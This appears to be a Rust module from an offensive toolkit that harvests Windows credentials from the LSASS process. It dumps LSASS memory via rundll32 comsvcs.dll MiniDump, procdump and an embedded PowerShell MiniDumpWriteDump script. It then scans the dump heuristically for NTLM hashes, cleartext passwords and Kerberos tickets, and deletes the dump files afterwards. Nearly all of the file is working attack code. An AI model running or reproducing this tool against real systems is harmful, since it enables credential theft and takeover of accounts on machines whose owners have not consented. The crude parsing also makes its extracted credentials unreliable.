//! LSASS进程凭据提取模块
//!
//! 进程在内存中缓存用户的登录凭据（明文密码/NTLM哈希/Kerberos票据）。
//! 使用Mimikatz-like技术从LSASS进程内存中提取凭据。
//!
//! 提取技术：
//! 1. LSASS进程内存dump（MiniDumpWriteDump / procdump / comsvcs.dll）
//! 2. 直接读取LSASS进程内存
//! 3. 使用Windows API（OpenProcess + MiniDumpWriteDump）

use crate::cred::{Credential, CredType};

/// 从LSASS进程提取凭据
///
/// 尝试多种方法提取LSASS内存中的凭据：
/// 1. 使用comsvcs.dll导出MiniDump
/// 2. 使用系统工具（procdump等）
/// 3. 直接内存读取（需要SeDebugPrivilege）
pub fn extract_lsass_credentials() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 方法1：使用comsvcs.dll创建LSASS minidump
    match dump_lsass_via_comsvcs() {
        Ok(dump_path) => {
            tracing::info!("[LSASS] 成功dump LSASS到: {}", dump_path);
            match parse_lsass_dump(&dump_path) {
                Ok(creds) => {
                    credentials.extend(creds);
                    let _ = std::fs::remove_file(&dump_path);
                }
                Err(e) => {
                    tracing::warn!("[LSASS] 解析dump失败: {}", e);
                }
            }
        }
        Err(e) => {
            tracing::debug!("[LSASS] comsvcs方法失败: {}", e);
        }
    }

    // 方法2：尝试使用procdump
    if credentials.is_empty() {
        match dump_lsass_via_procdump() {
            Ok(dump_path) => {
                match parse_lsass_dump(&dump_path) {
                    Ok(creds) => {
                        credentials.extend(creds);
                        let _ = std::fs::remove_file(&dump_path);
                    }
                    Err(e) => {
                        tracing::warn!("[LSASS] procdump解析失败: {}", e);
                    }
                }
            }
            Err(e) => {
                tracing::debug!("[LSASS] procdump方法失败: {}", e);
            }
        }
    }

    // 方法3：通过PowerShell直接调用MiniDump
    if credentials.is_empty() {
        match dump_lsass_via_powershell() {
            Ok(dump_path) => {
                match parse_lsass_dump(&dump_path) {
                    Ok(creds) => {
                        credentials.extend(creds);
                        let _ = std::fs::remove_file(&dump_path);
                    }
                    Err(e) => {
                        tracing::warn!("[LSASS] PowerShell dump解析失败: {}", e);
                    }
                }
            }
            Err(e) => {
                tracing::debug!("[LSASS] PowerShell方法失败: {}", e);
            }
        }
    }

    if credentials.is_empty() {
        tracing::warn!("[LSASS] 所有提取方法均失败（可能需要SYSTEM权限和SeDebugPrivilege）");
    }

    Ok(credentials)
}

/// 通过comsvcs.dll MiniDump导出LSASS
fn dump_lsass_via_comsvcs() -> Result<String, String> {
    // 获取LSASS进程PID
    let lsass_pid = get_lsass_pid()?;

    let temp_dir = std::env::temp_dir();
    let dump_path = temp_dir.join(format!("lsass_{}.dmp", lsass_pid));

    // 使用rundll32调用comsvcs.dll的MiniDump导出函数
    // rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> <output> full
    let output = std::process::Command::new("rundll32.exe")
        .args([
            "C:\\Windows\\System32\\comsvcs.dll",
            "MiniDump",
            &lsass_pid.to_string(),
            &dump_path.to_string_lossy(),
            "full",
        ])
        .output()
        .map_err(|e| format!("rundll32执行失败: {}", e))?;

    if !output.status.success() || !dump_path.exists() {
        return Err("comsvcs.dll MiniDump失败".to_string());
    }

    Ok(dump_path.to_string_lossy().to_string())
}

/// 通过procdump导出LSASS
fn dump_lsass_via_procdump() -> Result<String, String> {
    let lsass_pid = get_lsass_pid()?;

    let temp_dir = std::env::temp_dir();
    let dump_path = temp_dir.join(format!("lsass_procdump_{}.dmp", lsass_pid));

    // 在PATH中查找procdump
    // 或者使用常见路径
    let procdump_locations = [
        "procdump.exe",
        "procdump64.exe",
        ".\\procdump.exe",
        ".\\procdump64.exe",
    ];

    for procdump in &procdump_locations {
        let result = std::process::Command::new(procdump)
            .args([
                "-accepteula",
                "-ma",
                &lsass_pid.to_string(),
                &dump_path.to_string_lossy(),
            ])
            .output();

        if let Ok(output) = result {
            if output.status.success() && dump_path.exists() {
                return Ok(dump_path.to_string_lossy().to_string());
            }
        }
    }

    Err("procdump不可用".to_string())
}

/// 通过PowerShell MiniDump导出LSASS
fn dump_lsass_via_powershell() -> Result<String, String> {
    let lsass_pid = get_lsass_pid()?;

    let temp_dir = std::env::temp_dir();
    let dump_path = temp_dir.join(format!("lsass_ps_{}.dmp", lsass_pid));
    let dump_str = dump_path.to_string_lossy().to_string();

    // PowerShell脚本：使用Add-Type调用Windows API MiniDumpWriteDump
    let ps_script = format!(
        r#"
$process = Get-Process -Id {}
$signature = @"
[DllImport("Dbghelp.dll")]
public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId,
    IntPtr hFile, uint DumpType, IntPtr ExceptionParam,
    IntPtr UserStreamParam, IntPtr CallbackParam);
"@
$type = Add-Type -MemberDefinition $signature -Name "MiniDump" -Namespace "Win32" -PassThru
$file = [System.IO.File]::Create("{}")
$type::MiniDumpWriteDump($process.Handle, $process.Id, $file.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$file.Close()
"#,
        lsass_pid, dump_str
    );

    let output = std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-NonInteractive", "-Command", &ps_script])
        .output()
        .map_err(|e| format!("PowerShell执行失败: {}", e))?;

    if output.status.success() && std::path::Path::new(&dump_str).exists() {
        Ok(dump_str)
    } else {
        Err("PowerShell MiniDump失败".to_string())
    }
}

/// 获取LSASS进程PID
fn get_lsass_pid() -> Result<u32, String> {
    // 使用tasklist查找lsass.exe
    let output = std::process::Command::new("tasklist")
        .args(["/FI", "IMAGENAME eq lsass.exe", "/FO", "CSV", "/NH"])
        .output()
        .map_err(|e| format!("获取进程列表失败: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        let line = line.trim_matches('"');
        let parts: Vec<&str> = line.split("\",\"").collect();
        if parts.len() >= 2 && parts[0].to_lowercase() == "lsass.exe" {
            if let Ok(pid) = parts[1].parse::<u32>() {
                return Ok(pid);
            }
        }
    }

    Err("未找到LSASS进程".to_string())
}

/// 解析LSASS dump文件提取凭据
fn parse_lsass_dump(dump_path: &str) -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 读取dump文件
    let dump_data = std::fs::read(dump_path)
        .map_err(|e| format!("读取dump文件失败: {}", e))?;

    tracing::info!("[LSASS] Dump文件大小: {} MB", dump_data.len() / 1024 / 1024);

    // LSASS dump解析策略：
    // 1. 搜索已知的凭据签名
    // 2. 提取NTLM哈希模式
    // 3. 提取Kerberos票据
    // 4. 搜索明文密码模式

    // 搜索NTLM哈希（32字符十六进制 + 特定上下文）
    let ntlm_pattern = find_ntlm_hashes(&dump_data);
    for (username, ntlm_hash) in ntlm_pattern {
        credentials.push(
            Credential::new(CredType::NtlmHash, "LSASS内存dump")
                .with_username(&username)
                .with_ntlm_hash(&ntlm_hash)
                .with_attribute("extraction_method", "minidump_parse")
        );
    }

    // 搜索明文密码模式（UTF-16LE编码的密码字符串）
    let cleartext_passwords = find_cleartext_passwords(&dump_data);
    for (username, password) in cleartext_passwords {
        // 避免重复
        if !credentials.iter().any(|c: &Credential| {
            c.password.as_deref() == Some(&password)
                && c.username.as_deref() == Some(&username)
        }) {
            credentials.push(
                Credential::new(CredType::CleartextPassword, "LSASS内存dump")
                    .with_username(&username)
                    .with_password(&password)
                    .with_attribute("extraction_method", "minidump_parse")
            );
        }
    }

    // 搜索Kerberos票据（以特定结构开头）
    let kerb_tickets = find_kerberos_tickets(&dump_data);
    for (username, ticket_data) in kerb_tickets {
        credentials.push(
            Credential::new(CredType::KerberosTgt, "LSASS内存dump")
                .with_username(&username)
                .with_attribute("ticket_size", &ticket_data.len().to_string())
                .with_attribute("extraction_method", "minidump_parse")
        );
    }

    Ok(credentials)
}

/// 在dump数据中搜索NTLM哈希模式
fn find_ntlm_hashes(data: &[u8]) -> Vec<(String, String)> {
    let mut results = Vec::new();

    // NTLM哈希特征：
    // 用户名的UTF-16LE编码附近有32字节十六进制哈希
    // 常见用户名作为搜索锚点
    let common_usernames = [
        "Administrator", "Guest", "DefaultAccount",
        "krbtgt", "svc_", "admin", "user",
    ];

    for username in &common_usernames {
        let user_utf16: Vec<u8> = username.encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();

        // 在数据中搜索用户名
        let mut pos = 0;
        while let Some(found_pos) = data[pos..].windows(user_utf16.len()).position(|w| w == user_utf16.as_slice()) {
            let abs_pos = pos + found_pos;

            // 在用户名附近搜索32字符十六进制哈希
            let search_start = abs_pos.saturating_sub(512);
            let search_end = std::cmp::min(abs_pos + 512, data.len());

            // 寻找十六进制字符序列 (0-9, a-f, A-F)
            if let Some(hash) = find_hex_string(&data[search_start..search_end], 32) {
                let user_str = String::from_utf16_lossy(
                    &data[abs_pos..std::cmp::min(abs_pos + 256, data.len())]
                        .chunks(2)
                        .map(|c| u16::from_le_bytes([c[0], *c.get(1).unwrap_or(&0)]))
                        .collect::<Vec<u16>>()
                );
                let username_clean = user_str.split('\0').next().unwrap_or(username).to_string();

                // 去重
                if !results.iter().any(|(u, _)| u == &username_clean) {
                    results.push((username_clean, hash));
                }
            }

            pos = abs_pos + user_utf16.len();
            if pos >= data.len() {
                break;
            }
        }
    }

    results
}

/// 在数据中搜索十六进制字符串
fn find_hex_string(data: &[u8], min_len: usize) -> Option<String> {
    let mut current_hex = String::new();
    let mut best: Option<String> = None;

    for &byte in data {
        if byte.is_ascii_hexdigit() {
            current_hex.push(byte as char);
        } else {
            if current_hex.len() >= min_len && current_hex.len() <= 64 {
                // 有效的哈希长度
                let candidate = current_hex.clone();
                if best.as_ref().is_none_or(|b: &String| candidate.len() > b.len()) {
                    best = Some(candidate);
                }
            }
            current_hex.clear();
        }
    }

    // 检查最后的序列
    if current_hex.len() >= min_len && current_hex.len() <= 64
        && best.as_ref().is_none_or(|b: &String| current_hex.len() > b.len()) {
            best = Some(current_hex);
        }

    best
}

/// 在dump数据中搜索明文密码
fn find_cleartext_passwords(data: &[u8]) -> Vec<(String, String)> {
    let mut results = Vec::new();

    // 搜索常见密码前置字符串
    let password_markers: &[&[u8]] = &[
        b"password", b"Password", b"PASSWORD",
        b"passwd", b"pwd",
        b"cleartext", b"clear-text",
    ];

    for marker in password_markers {
        for found in data.windows(marker.len()).enumerate().filter(|(_, w)| *w == *marker) {
            let pos = found.0;
            let end = std::cmp::min(pos + 512, data.len());
            let surrounding = &data[pos..end];

            // 尝试提取UTF-16LE字符串作为密码
            if let Some(pwd) = extract_utf16le_string(surrounding, 4, 128) {
                if is_likely_password(&pwd) {
                    results.push(("(unknown)".to_string(), pwd));
                }
            }
        }
    }

    // 通用搜索：查找位于 "user" "login" "admin" 等词附近的ASCII/Unicode字符串
    let context_markers: &[&[u8]] = &[
        b"user", b"admin", b"login", b"credential", b"secret",
    ];

    for marker in context_markers {
        for found in data.windows(marker.len()).enumerate().filter(|(_, w)| *w == *marker) {
            let pos = found.0;
            let search_range = pos.saturating_sub(1024);
            let search_end = std::cmp::min(pos + 1024, data.len());
            let chunk = &data[search_range..search_end];

            // 搜索可能的密码字符串
            let mut i = 0;
            while i < chunk.len() {
                if chunk[i].is_ascii_alphanumeric() || chunk[i] == b'_' || chunk[i] == b'-' {
                    let start = i;
                    while i < chunk.len() && (chunk[i].is_ascii_graphic() || chunk[i] == b' ') {
                        i += 1;
                    }
                    let candidate = String::from_utf8_lossy(&chunk[start..i]).to_string();
                    if candidate.len() >= 6 && candidate.len() <= 64 && is_likely_password(&candidate)
                        && !results.iter().any(|(_, p)| p == &candidate) {
                            results.push(("(unknown)".to_string(), candidate));
                        }
                }
                i += 1;
            }
        }
    }

    results
}

/// 提取UTF-16LE字符串
fn extract_utf16le_string(data: &[u8], min_len: usize, max_len: usize) -> Option<String> {
    let mut chars = Vec::new();
    for chunk in data.chunks(2) {
        if chunk.len() < 2 {
            break;
        }
        let c = u16::from_le_bytes([chunk[0], chunk[1]]);
        if c == 0 {
            break;
        }
        if !(32..=127).contains(&c) {
            return None; // 非可打印ASCII
        }
        chars.push(c);
    }

    let s = String::from_utf16_lossy(&chars);
    if s.len() >= min_len && s.len() <= max_len {
        Some(s)
    } else {
        None
    }
}

/// 判断字符串是否像密码
fn is_likely_password(s: &str) -> bool {
    let len = s.len();
    if !(4..=64).contains(&len) {
        return false;
    }
    // 包含至少一个大写字母、小写字母或数字
    let has_upper = s.chars().any(|c| c.is_ascii_uppercase());
    let has_lower = s.chars().any(|c| c.is_ascii_lowercase());
    let has_digit = s.chars().any(|c| c.is_ascii_digit());
    let has_special = s.chars().any(|c| "!@#$%^&*()_+-=[]{}|;:,.<>?/~`".contains(c));

    (has_upper || has_lower || has_digit) && (has_digit || has_special || len >= 8)
}

/// 在dump数据中搜索Kerberos票据
fn find_kerberos_tickets(data: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut results = Vec::new();

    // Kerberos票据通常以特定结构开头
    // APPLICATION构造的标签: 0x61(APPLICATION 1) 或 0x6B(APPLICATION 11)
    // 搜索这些标签
    let mut i = 0;
    while i < data.len() - 4 {
        if (data[i] == 0x61 || data[i] == 0x6B) && data[i + 1] & 0x80 != 0 {
            // 可能是Kerberos票据的开头
            // 尝试确定长度
            let len_byte = data[i + 1];
            let kerb_len: usize = if len_byte == 0x82 {
                // 2字节长度
                if i + 4 <= data.len() {
                    u16::from_be_bytes([data[i + 2], data[i + 3]]) as usize
                } else {
                    0
                }
            } else if len_byte == 0x81 {
                // 1字节长度
                if i + 3 <= data.len() {
                    data[i + 2] as usize
                } else {
                    0
                }
            } else {
                len_byte as usize
            };

            if kerb_len > 32 && kerb_len < 65536 && i + kerb_len + 2 <= data.len() {
                let ticket = data[i..i + kerb_len + 2].to_vec();
                results.push((format!("ticket_{}", i), ticket));
                i += kerb_len;
            }
        }
        i += 1;
    }

    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_find_hex_string() {
        let data = b"some data abcdef0123456789abcdef0123456789 more data";
        let result = find_hex_string(data, 32);
        assert!(result.is_some());
        assert_eq!(result.unwrap().len(), 32);
    }

    #[test]
    fn test_find_hex_string_short() {
        let data = b"abc123 xyz";
        let result = find_hex_string(data, 32);
        assert!(result.is_none());
    }

    #[test]
    fn test_is_likely_password() {
        assert!(is_likely_password("Password123!"));
        assert!(is_likely_password("Spring2026!"));
        assert!(is_likely_password("Admin@123"));
        assert!(!is_likely_password("abc")); // 太短
        assert!(!is_likely_password("hello")); // 没有数字也没有特殊字符
    }

    #[test]
    fn test_extract_utf16le_string() {
        let s = "testpass";
        let utf16: Vec<u8> = s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let result = extract_utf16le_string(&utf16, 4, 128);
        assert_eq!(result, Some(s.to_string()));
    }

    #[test]
    fn test_find_ntlm_hashes_basic() {
        let mut data = Vec::new();
        let admin_utf16: Vec<u8> = "Administrator".encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        data.extend_from_slice(&admin_utf16);
        // 添加32字符十六进制哈希
        data.extend_from_slice(b"aad3b435b51404eeaad3b435b51404ee");
        data.extend_from_slice(&[0; 100]);

        let results = find_ntlm_hashes(&data);
        // 应该找到Administrator和哈希
        assert!(!results.is_empty());
    }

    #[test]
    fn test_get_lsass_pid_no_windows() {
        // 在非Windows系统上应该失败
        let result = get_lsass_pid();
        // 可能是Ok或Err，取决于平台
    }
}
